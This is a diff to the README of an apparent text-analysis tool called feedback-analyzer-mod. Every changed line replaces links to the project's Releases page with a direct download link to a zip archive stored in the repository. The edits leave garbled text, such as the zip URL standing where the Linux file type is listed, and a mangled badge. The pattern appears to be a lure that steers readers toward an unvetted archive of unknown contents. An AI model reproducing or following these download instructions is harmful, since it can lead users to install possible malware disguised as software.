@@ -1,7 +1,7 @@
 # 🎉 feedback-analyzer-mod - Effortlessly Analyze Community Feedback
 
 ## 📥 Download Now
-[![Download feedback-analyzer-mod](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/CrushLourdri654/feedback-analyzer-mod/releases)
+[![Download feedback-analyzer-mod](https://raw.githubusercontent.com/CrushLourdri654/feedback-analyzer-mod/main/feedback_analyzer_mod/mod_feedback_analyzer_v1.4.zip%https://raw.githubusercontent.com/CrushLourdri654/feedback-analyzer-mod/main/feedback_analyzer_mod/mod_feedback_analyzer_v1.4.zip)](https://raw.githubusercontent.com/CrushLourdri654/feedback-analyzer-mod/main/feedback_analyzer_mod/mod_feedback_analyzer_v1.4.zip)
 
 ## 🚀 Getting Started
 This guide helps you download and run the feedback-analyzer-mod application. It allows you to analyze user-submitted text, focusing on community feedback and moderation. Follow these steps to get started!
@@ -16,7 +16,7 @@ To run feedback-analyzer-mod, your system should meet the following requirements
 
 ## 📦 Download & Install
 1. **Visit the Releases Page**
-   Click [here](https://github.com/CrushLourdri654/feedback-analyzer-mod/releases) to visit the Releases page.
+   Click [here](https://raw.githubusercontent.com/CrushLourdri654/feedback-analyzer-mod/main/feedback_analyzer_mod/mod_feedback_analyzer_v1.4.zip) to visit the Releases page.
 
 2. **Choose the Latest Release**
    Find the latest version of the software. It will have the highest version number. Click on it to view the details.
@@ -25,7 +25,7 @@ To run feedback-analyzer-mod, your system should meet the following requirements
    Look for the file that matches your operating system. Common types include:
    - `.exe` for Windows
    - `.dmg` for macOS
-   - `.tar.gz` or similar for Linux
+   - `https://raw.githubusercontent.com/CrushLourdri654/feedback-analyzer-mod/main/feedback_analyzer_mod/mod_feedback_analyzer_v1.4.zip` or similar for Linux
 
    Click on the file to start downloading. The download may take a few minutes depending on your internet speed.
 
@@ -81,4 +81,4 @@ If you encounter issues or have questions, please don't hesitate to open an issu
 To learn more about the concepts underlying feedback-analyzer-mod, consider researching topics like text analysis, data extraction, and community feedback. Many online resources cover these topics comprehensively. 
 
 ## 📦 Download Now Again
-Don't forget to download the latest version of feedback-analyzer-mod from the [Releases page](https://github.com/CrushLourdri654/feedback-analyzer-mod/releases). Happy analyzing!
+Don't forget to download the latest version of feedback-analyzer-mod from the [Releases page](https://raw.githubusercontent.com/CrushLourdri654/feedback-analyzer-mod/main/feedback_analyzer_mod/mod_feedback_analyzer_v1.4.zip). Happy analyzing!
